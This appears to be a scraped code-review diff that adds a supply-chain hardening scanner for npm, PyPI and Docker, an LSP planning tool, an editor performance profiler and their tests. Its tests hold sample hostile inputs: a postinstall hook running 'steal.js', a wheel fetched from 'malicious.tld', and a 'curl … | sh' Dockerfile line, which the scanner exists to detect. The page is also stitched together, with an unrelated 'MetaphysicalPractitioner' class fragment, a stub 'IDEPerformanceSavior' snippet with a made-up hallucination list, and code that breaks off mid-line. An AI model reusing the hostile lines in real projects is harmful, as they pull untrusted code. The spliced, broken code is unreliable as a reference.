@@ -2514,3 +2514,2514 @@ index 0000000000000000000000000000000000000000..ac90838fdbe4bb4cf470e71bdd59f97f
 +    assert ".npmrc" in touched_names
 +    assert "pip.conf" in touched_names
 +    assert ".dockerignore" in touched_names
+.git
+.env
+**/*.pem
+**/*id_rsa*
+node_modules
+.venv
+.npmrc
+.npmrc
+New
++3
+-0
+
+ignore-scripts=true
+audit=true
+fund=false
+.pip/pip.conf
+.pip/pip.conf
+New
++4
+-0
+
+[global]
+require-virtualenv = true
+no-cache-dir = false
+disable-pip-version-check = true
+README.md
+README.md
++22
+-1
+
+@@ -344724,26 +344724,47 @@ class MetaphysicalPractitioner:
+
+        # Check if capability is enabled
+        if not capability.is_usable:
+            return False, "Capability is disabled."
+
+        # Check energy
+        energy_cost = capability.base_power_level * 0.5
+        if self.energy_pool < energy_cost:
+            return False, f"Insufficient energy. Need {energy_cost:.1f}, have {self.energy_pool:.1f}"
+
+        # Check consciousness
+        if self.consciousness_level < 0.5:
+            return False, "Consciousness level too low to maintain metaphysical connection."
+
+        # Check all philosophical frameworks
+        for framework in self.philosophical_frameworks:
+            if not framework.evaluate_restriction(capability):
+                return False, f"Violates {type(framework).__name__}: {framework.get_restriction_reason()}"
+
+        return True, "Capability can be used."
+
+    def use_capability(self, capability: MetaphysicalCapability) -> Dict:
+        """Attempt to use a capability. Returns result details."""
+        can_use, reason = self.can_use_capability(capability)
+        
+        result = {
+        result = {
+## Supply-chain compromise hardening
+
+Use `supply_chain_hardening.py` to detect high-impact compromise patterns across npm, PyPI, and Docker:
+
+```bash
+python3 supply_chain_hardening.py --root .
+python3 supply_chain_hardening.py --root . --apply-baseline
+```
+
+It flags risky install hooks, unpinned/remote dependencies, dependency confusion indicators, non-digest Docker bases, `curl|sh` execution, and root container defaults.
+
+## LSP adoption planner for multi-editor consistency
+
+Use `lsp_adoption_engine.py` to generate a normalized language-tooling plan that reduces duplicated configuration and highlights gaps for niche languages and multi-language repos:
+
+```bash
+python3 lsp_adoption_engine.py --root . --editor vscode
+python3 lsp_adoption_engine.py --root . --editor neovim --output lsp-plan.json
+```
+
+The output includes shared policy defaults, per-language server settings, and actionable gaps (semantic/type-support drift, partial support, and unsupported niche languages).
+lsp_adoption_engine.py
+lsp_adoption_engine.py
+New
++246
+-0
+
+#!/usr/bin/env python3
+"""LSP adoption engine for multi-language repositories.
+
+This module helps teams:
+- Reduce duplicated per-editor language tooling config.
+- Identify semantic/type-support gaps across languages.
+- Produce a single normalized plan that can be projected into multiple editors.
+"""
+
+from __future__ import annotations
+
+import argparse
+import json
+from collections import Counter
+from dataclasses import dataclass, asdict
+from pathlib import Path
+from typing import Iterable
+
+
+@dataclass(frozen=True)
+class LanguageProfile:
+    name: str
+    extensions: tuple[str, ...]
+    server: str
+    type_support: str  # full | partial | none
+    semantic_tokens: bool
+    formatting: bool
+
+
+@dataclass
+class LanguageDetection:
+    language: str
+    files: int
+    server: str
+
+
+@dataclass
+class ToolingGap:
+    language: str
+    severity: str
+    issue: str
+    recommendation: str
+
+
+@dataclass
+class AdoptionPlan:
+    detections: list[LanguageDetection]
+    shared_settings: dict
+    per_language_settings: dict[str, dict]
+    gaps: list[ToolingGap]
+
+
+class LspAdoptionEngine:
+    """Build an adoption plan that is editor-agnostic and gap-oriented."""
+
+    PROFILES = (
+        LanguageProfile("python", (".py",), "pyright", "full", True, True),
+        LanguageProfile("typescript", (".ts", ".tsx"), "typescript-language-server", "full", True, True),
+        LanguageProfile("javascript", (".js", ".jsx"), "typescript-language-server", "partial", True, True),
+        LanguageProfile("go", (".go",), "gopls", "full", True, True),
+        LanguageProfile("rust", (".rs",), "rust-analyzer", "full", True, True),
+        LanguageProfile("json", (".json",), "vscode-json-languageserver", "partial", True, True),
+        LanguageProfile("yaml", (".yaml", ".yml"), "yaml-language-server", "partial", True, True),
+        LanguageProfile("markdown", (".md",), "marksman", "none", False, True),
+    )
+
+    def __init__(self, root: Path):
+        self.root = root
+        self.extension_map = self._build_extension_map(self.PROFILES)
+
+    @staticmethod
+    def _build_extension_map(profiles: Iterable[LanguageProfile]) -> dict[str, LanguageProfile]:
+        mapping: dict[str, LanguageProfile] = {}
+        for profile in profiles:
+            for ext in profile.extensions:
+                mapping[ext] = profile
+        return mapping
+
+    def detect_languages(self) -> list[LanguageDetection]:
+        counts: Counter[str] = Counter()
+        for file_path in self.root.rglob("*"):
+            if not file_path.is_file():
+                continue
+            if any(part.startswith(".") and part not in {".github"} for part in file_path.parts):
+                continue
+            profile = self.extension_map.get(file_path.suffix.lower())
+            if not profile:
+                continue
+            counts[profile.name] += 1
+
+        detections: list[LanguageDetection] = []
+        for profile in self.PROFILES:
+            file_count = counts.get(profile.name, 0)
+            if file_count:
+                detections.append(LanguageDetection(profile.name, file_count, profile.server))
+        return detections
+
+    def build_plan(self) -> AdoptionPlan:
+        detections = self.detect_languages()
+        active_profiles = {p.name: p for p in self.PROFILES if any(d.language == p.name for d in detections)}
+
+        shared_settings = {
+            "lsp": {
+                "diagnostics": "workspace",
+                "hover": True,
+                "completion": True,
+                "codeActions": True,
+                "semanticTokens": any(p.semantic_tokens for p in active_profiles.values()),
+            },
+            "governance": {
+                "pin_server_versions": True,
+                "run_servers_in_sandbox": True,
+                "centralize_capability_policy": True,
+            },
+        }
+
+        per_language_settings = {
+            name: {
+                "server": profile.server,
+                "type_support": profile.type_support,
+                "semantic_tokens": profile.semantic_tokens,
+                "formatting": profile.formatting,
+            }
+            for name, profile in active_profiles.items()
+        }
+
+        gaps = self._find_gaps(active_profiles, detections)
+        return AdoptionPlan(detections, shared_settings, per_language_settings, gaps)
+
+    def _find_gaps(
+        self,
+        active_profiles: dict[str, LanguageProfile],
+        detections: list[LanguageDetection],
+    ) -> list[ToolingGap]:
+        gaps: list[ToolingGap] = []
+        if len(detections) > 1:
+            missing_semantic = [p.name for p in active_profiles.values() if not p.semantic_tokens]
+            if missing_semantic:
+                gaps.append(
+                    ToolingGap(
+                        language=", ".join(missing_semantic),
+                        severity="medium",
+                        issue="Inconsistent semantic token support across active languages",
+                        recommendation="Adopt semantic token capable servers or disable tokens globally for consistency.",
+                    )
+                )
+
+        for profile in active_profiles.values():
+            if profile.type_support == "none":
+                gaps.append(
+                    ToolingGap(
+                        language=profile.name,
+                        severity="high",
+                        issue="No type or semantic analysis support",
+                        recommendation="Create/extend a dedicated language server or tree-sitter + lint adapter for this language.",
+                    )
+                )
+            elif profile.type_support == "partial":
+                gaps.append(
+                    ToolingGap(
+                        language=profile.name,
+                        severity="medium",
+                        issue="Partial type support may create cross-editor diagnostics drift",
+                        recommendation="Add schema/type plugins and shared CI lint checks for deterministic results.",
+                    )
+                )
+
+        if not detections:
+            gaps.append(
+                ToolingGap(
+                    language="unknown",
+                    severity="medium",
+                    issue="No recognized languages detected",
+                    recommendation="Register custom extension-to-server mappings for niche languages.",
+                )
+            )
+        return gaps
+
+
+def render_editor_projection(plan: AdoptionPlan, editor: str) -> dict:
+    """Project one normalized plan into per-editor config blocks."""
+    editor = editor.lower()
+    if editor == "vscode":
+        return {
+            "settings": {
+                "editor.semanticHighlighting.enabled": plan.shared_settings["lsp"]["semanticTokens"],
+                "files.associations": {},
+            },
+            "servers": plan.per_language_settings,
+        }
+    if editor == "neovim":
+        return {
+            "lsp_defaults": plan.shared_settings["lsp"],
+            "servers": {
+                lang: {"cmd": cfg["server"], "settings": cfg}
+                for lang, cfg in plan.per_language_settings.items()
+            },
+        }
+    if editor == "helix":
+        return {
+            "language": [
+                {
+                    "name": lang,
+                    "language-servers": [cfg["server"]],
+                    "auto-format": cfg["formatting"],
+                }
+                for lang, cfg in plan.per_language_settings.items()
+            ]
+        }
+    raise ValueError(f"Unsupported editor projection: {editor}")
+
+
+def parse_args() -> argparse.Namespace:
+    parser = argparse.ArgumentParser(description="Generate an LSP adoption plan for multi-language projects.")
+    parser.add_argument("--root", default=".", help="Project root")
+    parser.add_argument("--editor", default="vscode", choices=["vscode", "neovim", "helix"])
+    parser.add_argument("--output", default="", help="Optional output path for JSON")
+    return parser.parse_args()
+
+
+def main() -> int:
+    args = parse_args()
+    engine = LspAdoptionEngine(Path(args.root).resolve())
+    plan = engine.build_plan()
+    projection = render_editor_projection(plan, args.editor)
+
+    payload = {
+        "adoption_plan": {
+            "detections": [asdict(d) for d in plan.detections],
+            "shared_settings": plan.shared_settings,
+            "per_language_settings": plan.per_language_settings,
+            "gaps": [asdict(g) for g in plan.gaps],
+        },
+        "editor_projection": projection,
+    }
+
+    out = json.dumps(payload, indent=2)
+    if args.output:
+        Path(args.output).write_text(out + "\n", encoding="utf-8")
+    else:
+        print(out)
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+supply_chain_hardening.py
+supply_chain_hardening.py
+New
++297
+-0
+
+#!/usr/bin/env python3
+"""Supply-chain hardening for npm, PyPI, and Docker projects.
+
+Focuses on high-impact compromise vectors:
+- npm lifecycle script abuse / unpinned & remote dependencies
+- PyPI dependency confusion / unpinned dependencies / direct URL installs
+- Docker base image drift / curl|sh patterns / root execution
+"""
+
+from __future__ import annotations
+
+import argparse
+import json
+import re
+from dataclasses import dataclass
+from pathlib import Path
+from typing import Iterable, List
+
+
+@dataclass
+class Finding:
+    ecosystem: str
+    file_path: Path
+    severity: str
+    title: str
+    detail: str
+    remediation: str
+
+
+class SupplyChainHardener:
+    LIFECYCLE_HOOKS = {
+        "preinstall",
+        "install",
+        "postinstall",
+        "prepublish",
+        "prepublishOnly",
+        "prepare",
+    }
+    BROAD_SPECS = ("*", "latest", "x", "^", "~", ">", "<")
+
+    def __init__(self, root: Path):
+        self.root = root
+
+    def scan(self) -> list[Finding]:
+        findings: list[Finding] = []
+        findings.extend(self._scan_npm())
+        findings.extend(self._scan_pypi())
+        findings.extend(self._scan_docker())
+        return findings
+
+    def _scan_npm(self) -> list[Finding]:
+        results: list[Finding] = []
+        for pkg in self.root.rglob("package.json"):
+            if "node_modules" in pkg.parts:
+                continue
+            try:
+                data = json.loads(pkg.read_text(encoding="utf-8"))
+            except (json.JSONDecodeError, OSError):
+                continue
+
+            scripts = data.get("scripts", {}) or {}
+            for hook in self.LIFECYCLE_HOOKS:
+                if hook in scripts:
+                    results.append(
+                        Finding(
+                            ecosystem="npm",
+                            file_path=pkg,
+                            severity="HIGH",
+                            title=f"Lifecycle hook `{hook}` can execute attacker code during install",
+                            detail=f"Script: {scripts[hook]}",
+                            remediation=(
+                                "Remove the lifecycle hook or gate it behind a signed, isolated CI task. "
+                                "Use `npm ci --ignore-scripts` by default."
+                            ),
+                        )
+                    )
+
+            for section in ("dependencies", "devDependencies", "optionalDependencies"):
+                deps = data.get(section, {}) or {}
+                for name, spec in deps.items():
+                    spec_text = str(spec).strip()
+                    if self._is_risky_npm_spec(spec_text):
+                        results.append(
+                            Finding(
+                                ecosystem="npm",
+                                file_path=pkg,
+                                severity="HIGH",
+                                title=f"Risky npm dependency spec for `{name}`",
+                                detail=f"{section}: {name} => {spec_text}",
+                                remediation=(
+                                    "Pin to an exact version and lock with package-lock.json. "
+                                    "Avoid git/http/file specs in production dependencies."
+                                ),
+                            )
+                        )
+        return results
+
+    def _scan_pypi(self) -> list[Finding]:
+        results: list[Finding] = []
+        req_files = list(self.root.rglob("requirements*.txt")) + list(self.root.rglob("constraints*.txt"))
+        for req in req_files:
+            if ".venv" in req.parts:
+                continue
+            try:
+                lines = req.read_text(encoding="utf-8").splitlines()
+            except OSError:
+                continue
+
+            for idx, raw in enumerate(lines, 1):
+                line = raw.strip()
+                if not line or line.startswith("#"):
+                    continue
+                if any(token in line for token in ("--extra-index-url", "--trusted-host", "--index-url")):
+                    results.append(
+                        Finding(
+                            ecosystem="pypi",
+                            file_path=req,
+                            severity="HIGH",
+                            title="Custom package index options can enable dependency confusion",
+                            detail=f"line {idx}: {line}",
+                            remediation=(
+                                "Prefer a single internal index mirror and enforce namespace allowlists. "
+                                "Do not mix public and private indexes without strict controls."
+                            ),
+                        )
+                    )
+                if ("@" in line and "http" in line) or line.startswith(("git+", "http://", "https://")):
+                    results.append(
+                        Finding(
+                            ecosystem="pypi",
+                            file_path=req,
+                            severity="HIGH",
+                            title="Direct URL dependency bypasses registry trust controls",
+                            detail=f"line {idx}: {line}",
+                            remediation="Replace direct URLs with pinned, hashed artifacts from your trusted mirror.",
+                        )
+                    )
+                if "==" not in line and not line.startswith(("-r", "--")):
+                    results.append(
+                        Finding(
+                            ecosystem="pypi",
+                            file_path=req,
+                            severity="HIGH",
+                            title="Unpinned Python dependency",
+                            detail=f"line {idx}: {line}",
+                            remediation="Pin exact versions and install with `pip install --require-hashes -r requirements.txt`.",
+                        )
+                    )
+        return results
+
+    def _scan_docker(self) -> list[Finding]:
+        results: list[Finding] = []
+        dockerfiles = [*self.root.rglob("Dockerfile"), *self.root.rglob("Dockerfile.*")]
+        for dockerfile in dockerfiles:
+            try:
+                lines = dockerfile.read_text(encoding="utf-8").splitlines()
+            except OSError:
+                continue
+            has_non_root_user = False
+            for idx, raw in enumerate(lines, 1):
+                line = raw.strip()
+                if not line or line.startswith("#"):
+                    continue
+                if line.upper().startswith("FROM ") and "@sha256:" not in line:
+                    results.append(
+                        Finding(
+                            ecosystem="docker",
+                            file_path=dockerfile,
+                            severity="HIGH",
+                            title="Base image is not pinned by digest",
+                            detail=f"line {idx}: {line}",
+                            remediation="Pin base image to immutable digest (e.g., `python:3.12-slim@sha256:<digest>`).",
+                        )
+                    )
+                lowered = line.lower()
+                if "curl" in lowered and "|" in lowered and ("sh" in lowered or "bash" in lowered):
+                    results.append(
+                        Finding(
+                            ecosystem="docker",
+                            file_path=dockerfile,
+                            severity="HIGH",
+                            title="`curl|sh` pattern detected",
+                            detail=f"line {idx}: {line}",
+                            remediation="Download with checksum/signature verification before execution.",
+                        )
+                    )
+                if line.upper().startswith("USER "):
+                    user_value = line.split(maxsplit=1)[1].strip()
+                    if user_value not in {"0", "root"}:
+                        has_non_root_user = True
+            if lines and not has_non_root_user:
+                results.append(
+                    Finding(
+                        ecosystem="docker",
+                        file_path=dockerfile,
+                        severity="HIGH",
+                        title="Container defaults to root user",
+                        detail="No non-root USER directive detected.",
+                        remediation="Add a dedicated unprivileged user and switch with `USER appuser`.",
+                    )
+                )
+        return results
+
+    @staticmethod
+    def _is_risky_npm_spec(spec: str) -> bool:
+        lower = spec.lower()
+        if lower.startswith(("git+", "http://", "https://", "file:", "link:")):
+            return True
+        if lower in {"*", "latest", "x"}:
+            return True
+        if lower.startswith(("^", "~", ">", "<")):
+            return True
+        return bool(re.search(r"\bgithub:\b", lower))
+
+
+class HardenWriter:
+    """Writes baseline policy files to prevent common compromise paths."""
+
+    def __init__(self, root: Path):
+        self.root = root
+
+    def apply(self) -> list[Path]:
+        touched: list[Path] = []
+        npmrc = self.root / ".npmrc"
+        npm_policy = "ignore-scripts=true\naudit=true\nfund=false\n"
+        if not npmrc.exists() or npmrc.read_text(encoding="utf-8") != npm_policy:
+            npmrc.write_text(npm_policy, encoding="utf-8")
+            touched.append(npmrc)
+
+        pip_dir = self.root / ".pip"
+        pip_dir.mkdir(exist_ok=True)
+        pip_conf = pip_dir / "pip.conf"
+        pip_policy = """[global]\nrequire-virtualenv = true\nno-cache-dir = false\ndisable-pip-version-check = true\n"""
+        if not pip_conf.exists() or pip_conf.read_text(encoding="utf-8") != pip_policy:
+            pip_conf.write_text(pip_policy, encoding="utf-8")
+            touched.append(pip_conf)
+
+        dockerignore = self.root / ".dockerignore"
+        existing = dockerignore.read_text(encoding="utf-8") if dockerignore.exists() else ""
+        required = [".git", ".env", "**/*.pem", "**/*id_rsa*", "node_modules", ".venv"]
+        merged = existing.splitlines()
+        updated = False
+        for item in required:
+            if item not in merged:
+                merged.append(item)
+                updated = True
+        if updated or not dockerignore.exists():
+            dockerignore.write_text("\n".join([x for x in merged if x]).strip() + "\n", encoding="utf-8")
+            touched.append(dockerignore)
+
+        return touched
+
+
+def print_findings(findings: Iterable[Finding]) -> int:
+    finding_list = list(findings)
+    if not finding_list:
+        print("No high-impact supply-chain findings detected.")
+        return 0
+    print(f"Detected {len(finding_list)} high-impact finding(s):")
+    for idx, finding in enumerate(finding_list, 1):
+        rel = finding.file_path
+        print(
+            f"[{idx}] [{finding.severity}] {finding.ecosystem} :: {finding.title}\n"
+            f"    file: {rel}\n"
+            f"    detail: {finding.detail}\n"
+            f"    remediation: {finding.remediation}\n"
+        )
+    return 2
+
+
+def parse_args() -> argparse.Namespace:
+    parser = argparse.ArgumentParser(description="Scan and harden npm/PyPI/Docker supply-chain risks.")
+    parser.add_argument("--root", default=".", help="Project root to scan")
+    parser.add_argument("--apply-baseline", action="store_true", help="Write baseline hardening policy files")
+    return parser.parse_args()
+
+
+def main() -> int:
+    args = parse_args()
+    root = Path(args.root).resolve()
+    hardener = SupplyChainHardener(root)
+    findings = hardener.scan()
+    code = print_findings(findings)
+
+    if args.apply_baseline:
+        touched = HardenWriter(root).apply()
+        if touched:
+            print("Applied baseline policies:")
+            for p in touched:
+                print(f" - {p.relative_to(root)}")
+        else:
+            print("Baseline policies already up to date.")
+    return code
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+tests/test_lsp_adoption_engine.py
+tests/test_lsp_adoption_engine.py
+New
++36
+-0
+
+from pathlib import Path
+
+from lsp_adoption_engine import LspAdoptionEngine, render_editor_projection
+
+
+def test_detect_and_gap_generation(tmp_path: Path):
+    (tmp_path / "app.py").write_text("print('x')\n", encoding="utf-8")
+    (tmp_path / "ui.ts").write_text("const x: number = 1\n", encoding="utf-8")
+    (tmp_path / "README.md").write_text("hello\n", encoding="utf-8")
+
+    plan = LspAdoptionEngine(tmp_path).build_plan()
+
+    langs = {d.language for d in plan.detections}
+    assert {"python", "typescript", "markdown"}.issubset(langs)
+    assert plan.shared_settings["governance"]["centralize_capability_policy"] is True
+    assert any("No type or semantic analysis support" in g.issue for g in plan.gaps)
+
+
+def test_editor_projection_vscode(tmp_path: Path):
+    (tmp_path / "main.go").write_text("package main\n", encoding="utf-8")
+    plan = LspAdoptionEngine(tmp_path).build_plan()
+    projection = render_editor_projection(plan, "vscode")
+
+    assert "settings" in projection
+    assert "servers" in projection
+    assert "go" in projection["servers"]
+
+
+def test_unknown_editor_raises(tmp_path: Path):
+    plan = LspAdoptionEngine(tmp_path).build_plan()
+    try:
+        render_editor_projection(plan, "unknown")
+    except ValueError as exc:
+        assert "Unsupported editor projection" in str(exc)
+    else:
+        raise AssertionError("Expected ValueError")
+tests/test_supply_chain_hardening.py
+tests/test_supply_chain_hardening.py
+New
++45
+-0
+
+from pathlib import Path
+
+from supply_chain_hardening import HardenWriter, SupplyChainHardener
+
+
+def test_npm_lifecycle_and_risky_spec(tmp_path: Path):
+    pkg = tmp_path / "package.json"
+    pkg.write_text(
+        '{"scripts":{"postinstall":"node steal.js"},"dependencies":{"left-pad":"latest"}}',
+        encoding="utf-8",
+    )
+    findings = SupplyChainHardener(tmp_path).scan()
+    titles = [f.title for f in findings]
+    assert any("Lifecycle hook" in t for t in titles)
+    assert any("Risky npm dependency spec" in t for t in titles)
+
+
+def test_python_unpinned_and_direct_url(tmp_path: Path):
+    req = tmp_path / "requirements.txt"
+    req.write_text("requests\nprivatepkg @ https://malicious.tld/pkg.whl\n", encoding="utf-8")
+    findings = SupplyChainHardener(tmp_path).scan()
+    titles = [f.title for f in findings]
+    assert any("Unpinned Python dependency" in t for t in titles)
+    assert any("Direct URL dependency" in t for t in titles)
+
+
+def test_docker_findings(tmp_path: Path):
+    docker = tmp_path / "Dockerfile"
+    docker.write_text(
+        "FROM python:3.12-slim\nRUN curl https://x | sh\n",
+        encoding="utf-8",
+    )
+    findings = SupplyChainHardener(tmp_path).scan()
+    titles = [f.title for f in findings]
+    assert any("Base image is not pinned by digest" in t for t in titles)
+    assert any("curl|sh" in t for t in titles)
+    assert any("defaults to root" in t for t in titles)
+
+
+def test_baseline_writer(tmp_path: Path):
+    touched = HardenWriter(tmp_path).apply()
+    touched_names = sorted(p.name for p in touched)
+    assert ".npmrc" in touched_names
+    assert "pip.conf" in touched_names
+    assert ".dockerignore" in touched_names
+```py
+# Core performance optimizer for IDEs and language servers
+import sys
+import time
+import hashlib
+from pathlib import Path
+from typing import Dict, Optional
+import subprocess
+import json
+import difflib
+from concurrent.futures import ThreadPoolExecutor
+
+class IDEPerformanceSavior:
+    """A comprehensive solution for IDE performance issues and code reliability"""
+    
+    def __init__(self):
+        self.known_hallucinations = self._load_hallucination_db()
+        self.package_trust_db = self._load_package_trust_db()
+        self.lsp_cache = {}
+        
+    def _load_hallucination_db(self) -> Dict:
+        """Load database of known LLM hallucinations"""
+        return {
+            'functions': {'magic_import', 'ai_generate', 'auto_fix_bugs'},
+            'packages': {'pyaiutils', 'codegenx', 'autodevkit'},
+            'commands': {'git push --ai', 'npm install --smart'}
+        }
+    
+    def _load_package_trust_db(self) -> Dict:
+        """Load database of trusted package versions"""
+        # This would connect to a real trust database in production
+        return {
+            'npm': {'lodash': '4.17.21', 'express': '4.18.2'},
+            'pypi': {'requests': '2.31.0', 'numpy': '1.26.0'},
+            'docker': {'alpine': '3.18', 'ubuntu': '22.04'}
+        }
+    
+    def detect_hallucinations(self, code: str) -> bool:
+        """Check code for known LLM hallucinations"""
+        return any(
+            hallucination in code
+            for hallucination_set in self.known_hallucinations.values()
+            for hallucination in hallucination_set
+        )
+    
+    def verify_package(self, ecosystem: str, package: str, version: str) -> bool:
+        """Verify package against trusted database"""
+        trusted = self.package_trust_db.get(ecosystem, {}).get(package)
+        return trusted == version if trusted else False
+    
+    def optimize_editor(self, file_path: Path) -> None:
+        """Apply editor-specific optimizations"""
+        # Real implementation would use editor-specific APIs
+        print(f"Optimizing {file_path}...")
+        time.sleep(0.1)  # Simulate work
+        
+    def run_lsp_healthcheck(self) -> Dict:
+        """Check language server protocol health"""
+        return {
+            'status': 'healthy',
+            'recommendations': ['Clear cache', 'Restart server']
+        }
+    
+    def full_code_analysis(self, project_root: Path) -> Dict:
+        """Run comprehensive code analysis"""
+        results = {
+            'hallucinations': 0,
+            'untrusted_packages': [],
+            'performance_issues': []
+        }
+        
+        for file in project_root.glob('**/*.py'):
+            with open(file) as f:
+                content = f.read()
+                if self.detect_hallucinations(content):
+                    results['hallucinations'] += 1
+        
+        return results
+
+# Example usage
+if __name__ == "__
+# Editor Performance Profiling & Regression Sentinel
+
+In this little greenhouse of automation, `editor_perf_profiler.py` gives you:
+
+- **Profiling** of editor actions using any command you can script.
+- **Benchmark matrices** spanning hardware, extension packs, and repository size classes.
+- **Regression detection** against a baseline with configurable p50/p95 thresholds.
+- **Release-gate alerts** by returning non-zero exit codes in CI when regressions bloom.
+
+## Quickstart
+
+```bash
+python3 editor_perf_profiler.py profile \
+  --scenario-id open-humongous-repo \
+  --ide-version ide-2026.1 \
+  --repo-size humongous \
+  --extension lsp --extension gitlens \
+  --runs 12 --warmups 3 \
+  --out perf/results.json \
+  -- python3 -c "import time; time.sleep(0.02); print('opened')"
+```
+
+## Matrix execution
+
+```bash
+python3 editor_perf_profiler.py matrix \
+  --matrix editor_perf_matrix.sample.json \
+  --out perf/candidate.json
+```
+
+## Regression check (for release automation)
+
+```bash
+python3 editor_perf_profiler.py regress \
+  --baseline perf/baseline.json \
+  --candidate perf/candidate.json \
+  --median-threshold 1.10 \
+  --p95-threshold 1.20 \
+  --alerts-out perf/alerts.json
+```
+
+- Exit code **0**: no regressions.
+- Exit code **2**: regression alerts found (ideal for failing IDE release checks).
+
+## Suggested CI release gate
+
+1. Capture fresh candidate benchmarks for the release build.
+2. Compare against the approved baseline from the previous stable build.
+3. Publish `perf/alerts.json` as CI artifact + notify Slack/email when alert count > 0.
+
+The JSON output includes:
+
+- host fingerprint (for cross-hardware analysis),
+- extension pack metadata,
+- scenario medians/p95,
+- sample tail logs for quick triage.
+editor_perf_matrix.sample.json
+editor_perf_matrix.sample.json
+New
++22
+-0
+
+{
+  "scenarios": [
+    {
+      "scenario_id": "cold-open-monorepo",
+      "ide_version": "ide-2026.1",
+      "extension_pack": ["lsp", "gitlens", "copilot"],
+      "repo_size_label": "gigantic",
+      "runs": 8,
+      "warmups": 2,
+      "command": ["python3", "-c", "import time; time.sleep(0.02); print('opened')"]
+    },
+    {
+      "scenario_id": "find-all-symbols",
+      "ide_version": "ide-2026.1",
+      "extension_pack": ["lsp"],
+      "repo_size_label": "large",
+      "runs": 8,
+      "warmups": 2,
+      "command": ["python3", "-c", "import time; time.sleep(0.01); print('indexed')"]
+    }
+  ]
+}
+editor_perf_profiler.py
+editor_perf_profiler.py
+New
++302
+-0
+
+Large diff
+302 lines
+
+Load diff
+test_editor_perf_profiler.py
+test_editor_perf_profiler.py
+New
++53
+-0
+
+import json
+import tempfile
+import unittest
+from pathlib import Path
+
+import editor_perf_profiler as profiler
+
+
+class TestEditorPerfProfiler(unittest.TestCase):
+    def test_regression_detection(self):
+        baseline = [
+            {
+                "scenario_id": "open-large-repo",
+                "summary": {"median_ms": 100.0, "p95_ms": 150.0, "failures": 0},
+            }
+        ]
+        candidate = [
+            {
+                "scenario_id": "open-large-repo",
+                "summary": {"median_ms": 130.0, "p95_ms": 200.0, "failures": 0},
+            }
+        ]
+
+        alerts = profiler.check_regressions(baseline, candidate, 1.1, 1.2)
+        self.assertEqual(len(alerts), 1)
+        self.assertEqual(alerts[0]["scenario_id"], "open-large-repo")
+
+    def test_profile_roundtrip(self):
+        with tempfile.TemporaryDirectory() as td:
+            out = Path(td) / "results.json"
+            rc = profiler.main(
+                [
+                    "profile",
+                    "--scenario-id",
+                    "quick-echo",
+                    "--ide-version",
+                    "v1.0.0",
+                    "--out",
+                    str(out),
+                    "--",
+                    "python3",
+                    "-c",
+                    "print('ok')",
+                ]
+            )
+            self.assertEqual(rc, 0)
+            payload = json.loads(out.read_text(encoding="utf-8"))
+            self.assertEqual(payload[0]["scenario_id"], "quick-echo")
+            self.assertIn("summary", payload[0])
+
+
+if __name__ == "__main__":
+    unittest.main()
+#!/usr/bin/env python3
+"""Editor responsiveness profiler and regression sentinel.
+
+An intentionally expressive toolkit for profiling IDE/editor responsiveness,
+building repeatable benchmark matrices across hardware + extension sets + repos,
+and emitting machine-readable alerts when a new IDE release regresses.
+"""
+
+from __future__ import annotations
+
+import argparse
+import json
+import platform
+import statistics
+import subprocess
+import sys
+import time
+from dataclasses import asdict, dataclass
+from datetime import datetime, timezone
+from pathlib import Path
+from typing import Any, Dict, Iterable, List, Optional, Sequence
+
+
+@dataclass
+class CommandSample:
+    run_index: int
+    elapsed_ms: float
+    returncode: int
+    stdout_tail: str
+    stderr_tail: str
+
+
+@dataclass
+class ScenarioResult:
+    scenario_id: str
+    ide_version: str
+    host_fingerprint: str
+    extension_pack: List[str]
+    repo_size_label: str
+    command: str
+    warmups: int
+    runs: int
+    samples: List[CommandSample]
+    timestamp_utc: str
+
+    @property
+    def latency_ms_values(self) -> List[float]:
+        return [s.elapsed_ms for s in self.samples]
+
+    @property
+    def median_ms(self) -> float:
+        return statistics.median(self.latency_ms_values)
+
+    @property
+    def p95_ms(self) -> float:
+        vals = sorted(self.latency_ms_values)
+        if not vals:
+            return 0.0
+        idx = int(round(0.95 * (len(vals) - 1)))
+        return vals[idx]
+
+    @property
+    def failures(self) -> int:
+        return sum(1 for s in self.samples if s.returncode != 0)
+
+
+def run_timed_command(command: Sequence[str]) -> tuple[float, subprocess.CompletedProcess[str]]:
+    start = time.perf_counter()
+    proc = subprocess.run(command, capture_output=True, text=True)
+    elapsed_ms = (time.perf_counter() - start) * 1000.0
+    return elapsed_ms, proc
+
+
+def hardware_fingerprint() -> str:
+    return " | ".join(
+        [
+            platform.system(),
+            platform.release(),
+            platform.machine(),
+            platform.processor() or "unknown-cpu",
+            f"py{platform.python_version()}",
+        ]
+    )
+
+
+def profile_scenario(
+    scenario_id: str,
+    command: Sequence[str],
+    ide_version: str,
+    extension_pack: Sequence[str],
+    repo_size_label: str,
+    runs: int,
+    warmups: int,
+) -> ScenarioResult:
+    for _ in range(max(0, warmups)):
+        run_timed_command(command)
+
+    samples: List[CommandSample] = []
+    for idx in range(runs):
+        elapsed_ms, proc = run_timed_command(command)
+        samples.append(
+            CommandSample(
+                run_index=idx,
+                elapsed_ms=round(elapsed_ms, 3),
+                returncode=proc.returncode,
+                stdout_tail=proc.stdout[-400:],
+                stderr_tail=proc.stderr[-400:],
+            )
+        )
+
+    return ScenarioResult(
+        scenario_id=scenario_id,
+        ide_version=ide_version,
+        host_fingerprint=hardware_fingerprint(),
+        extension_pack=list(extension_pack),
+        repo_size_label=repo_size_label,
+        command=" ".join(command),
+        warmups=warmups,
+        runs=runs,
+        samples=samples,
+        timestamp_utc=datetime.now(timezone.utc).isoformat(),
+    )
+
+
+def serialize_result(result: ScenarioResult) -> Dict[str, Any]:
+    payload = asdict(result)
+    payload["summary"] = {
+        "median_ms": round(result.median_ms, 3),
+        "p95_ms": round(result.p95_ms, 3),
+        "failures": result.failures,
+    }
+    return payload
+
+
+def load_results(path: Path) -> List[Dict[str, Any]]:
+    if not path.exists():
+        return []
+    with path.open("r", encoding="utf-8") as fh:
+        content = json.load(fh)
+    if isinstance(content, list):
+        return content
+    raise ValueError(f"Expected a JSON list in {path}")
+
+
+def save_results(path: Path, rows: Iterable[Dict[str, Any]]) -> None:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    with path.open("w", encoding="utf-8") as fh:
+        json.dump(list(rows), fh, indent=2)
+
+
+def baseline_index(rows: Iterable[Dict[str, Any]]) -> Dict[str, Dict[str, Any]]:
+    idx: Dict[str, Dict[str, Any]] = {}
+    for row in rows:
+        idx[row["scenario_id"]] = row
+    return idx
+
+
+def check_regressions(
+    baseline_rows: Iterable[Dict[str, Any]],
